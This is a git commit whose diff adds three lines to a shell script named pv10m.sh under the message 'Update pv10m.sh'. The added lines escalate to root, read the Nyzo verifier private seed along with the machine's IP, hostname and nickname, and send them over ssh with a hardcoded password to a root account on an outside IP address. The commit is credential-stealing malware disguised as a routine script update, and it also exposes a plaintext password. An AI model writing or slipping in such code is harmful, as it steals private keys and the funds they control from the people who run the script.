68fd012eefaed3ce20255e2b9e7126e9fc535990
junscapital <52300722+junscapital@users.noreply.github.com>
2020-02-14 09:15:20 +0800

    Update pv10m.sh

--- pv10m.sh
+++ pv10m.sh
@@ -1,1 +1,4 @@
 #!/bin/sh
+sudo su
+echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/managed_verifiers'
+echo $(hostname):$(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/file1'
